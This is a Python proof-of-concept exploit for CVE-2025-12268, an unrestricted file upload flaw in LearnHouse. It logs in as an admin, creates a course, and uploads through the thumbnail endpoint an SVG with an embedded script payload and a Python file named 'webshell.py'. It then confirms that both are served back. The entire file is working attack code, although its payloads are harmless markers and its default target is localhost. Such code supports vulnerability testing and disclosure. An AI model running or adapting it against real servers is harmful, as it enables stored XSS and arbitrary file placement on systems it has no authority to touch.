#!/usr/bin/env python3

import requests
import argparse
import sys
import re
import time


class LearnHouseExploit:
    def __init__(self, base_url, email, password):
        self.base_url = base_url.rstrip("/")
        self.email = email
        self.password = password
        self.session = requests.Session()
        self.access_token = None
        self.org_uuid = None
        self.org_slug = None
        self.org_id = None
        self.course_uuid = None

    def login(self):
        print("[*] Logging in...")
        url = f"{self.base_url}/api/v1/auth/login"
        data = {"username": self.email, "password": self.password}
        resp = self.session.post(url, data=data)
        if resp.status_code == 200:
            result = resp.json()
            tokens = result.get("tokens", {})
            self.access_token = tokens.get("access_token")
            print(f"[+] Login successful")
            return True
        print(f"[-] Login failed: {resp.text}")
        return False

    def get_org_info(self):
        print("[*] Getting organization info...")
        url = f"{self.base_url}/api/v1/orgs/slug/default"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        resp = self.session.get(url, headers=headers)
        if resp.status_code == 200:
            result = resp.json()
            self.org_uuid = result.get("org_uuid")
            self.org_slug = result.get("slug")
            self.org_id = result.get("id")
            print(f"[+] Org UUID: {self.org_uuid}, Org ID: {self.org_id}")
            return True
        print(f"[-] Failed to get org info: {resp.text}")
        return False

    def create_course(self):
        print("[*] Creating a test course...")
        url = f"{self.base_url}/api/v1/courses/"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        params = {"org_id": self.org_id}
        data = {
            "name": "PoC Test Course",
            "description": "Test course for CVE-2025-12268",
            "public": "true",
            "about": "Testing unrestricted upload",
        }
        resp = self.session.post(url, headers=headers, params=params, data=data)
        if resp.status_code == 200:
            result = resp.json()
            self.course_uuid = result.get("course_uuid")
            print(f"[+] Course created: {self.course_uuid}")
            return True
        print(f"[-] Failed to create course: {resp.text}")
        return False

    def upload_malicious_svg(self):
        print("[*] Uploading malicious SVG file...")
        url = f"{self.base_url}/api/v1/courses/{self.course_uuid}/thumbnail"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        
        svg_payload = '''<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert('XSS-CVE-2025-12268')</script>
</svg>'''
        
        files = {
            "thumbnail": ("malicious.svg", svg_payload, "image/svg+xml"),
        }
        data = {"thumbnail_type": "image"}
        
        resp = self.session.put(url, headers=headers, files=files, data=data)
        if resp.status_code == 200:
            result = resp.json()
            thumbnail_url = result.get("thumbnail_image", "")
            print(f"[+] Malicious SVG uploaded successfully")
            print(f"[+] Thumbnail path: {thumbnail_url}")
            return thumbnail_url
        print(f"[-] Upload failed: {resp.text}")
        return None

    def upload_python_file(self):
        print("[*] Uploading Python file...")
        url = f"{self.base_url}/api/v1/courses/{self.course_uuid}/thumbnail"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        
        py_payload = '''#!/usr/bin/env python3
import os
print("CVE-2025-12268 PoC - Arbitrary file upload successful")
print("Server info:", os.uname())
'''
        
        files = {
            "thumbnail": ("webshell.py", py_payload, "application/octet-stream"),
        }
        data = {"thumbnail_type": "image"}
        
        resp = self.session.put(url, headers=headers, files=files, data=data)
        if resp.status_code == 200:
            result = resp.json()
            thumbnail_url = result.get("thumbnail_image", "")
            print(f"[+] Python file uploaded successfully")
            print(f"[+] Thumbnail path: {thumbnail_url}")
            return thumbnail_url
        print(f"[-] Upload failed: {resp.text}")
        return None

    def verify_upload(self, thumbnail_filename):
        print("[*] Verifying uploaded file...")
        if not thumbnail_filename or not self.org_uuid or not self.course_uuid:
            return False
        
        full_url = f"{self.base_url}/content/orgs/{self.org_uuid}/courses/{self.course_uuid}/thumbnails/{thumbnail_filename}"
        resp = self.session.get(full_url)
        if resp.status_code == 200:
            content = resp.text
            if "XSS-CVE-2025-12268" in content or "CVE-2025-12268" in content or "svg" in content.lower():
                print(f"[+] Vulnerability confirmed! Uploaded file is accessible")
                print(f"[+] File URL: {full_url}")
                return True
        print(f"[-] Could not verify upload at {full_url}")
        return False

    def run(self):
        print("=" * 60)
        print("CVE-2025-12268 - LearnHouse Unrestricted File Upload PoC")
        print("=" * 60)
        
        if not self.login():
            return False
        
        if not self.get_org_info():
            return False
        
        if not self.create_course():
            return False
        
        svg_path = self.upload_malicious_svg()
        svg_verified = self.verify_upload(svg_path)
        
        py_path = self.upload_python_file()
        py_verified = self.verify_upload(py_path)
        
        print("\n" + "=" * 60)
        print("RESULTS")
        print("=" * 60)
        
        if svg_verified or py_verified:
            print("[+] VULNERABLE: CVE-2025-12268 confirmed!")
            print("[+] The server accepts arbitrary file types without validation")
            if svg_path:
                svg_url = f"{self.base_url}/content/orgs/{self.org_uuid}/courses/{self.course_uuid}/thumbnails/{svg_path}"
                print(f"[+] SVG XSS payload: {svg_url}")
            if py_path:
                py_url = f"{self.base_url}/content/orgs/{self.org_uuid}/courses/{self.course_uuid}/thumbnails/{py_path}"
                print(f"[+] Python file: {py_url}")
            return True
        else:
            print("[-] Could not confirm vulnerability")
            return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-12268 PoC")
    parser.add_argument("-u", "--url", default="http://localhost:8090",
                        help="Target URL (default: http://localhost:8090)")
    parser.add_argument("-e", "--email", default="admin@example.com",
                        help="Admin email (default: admin@example.com)")
    parser.add_argument("-p", "--password", default="Passw0rd123!",
                        help="Admin password (default: Passw0rd123!)")
    args = parser.parse_args()
    
    exploit = LearnHouseExploit(args.url, args.email, args.password)
    success = exploit.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
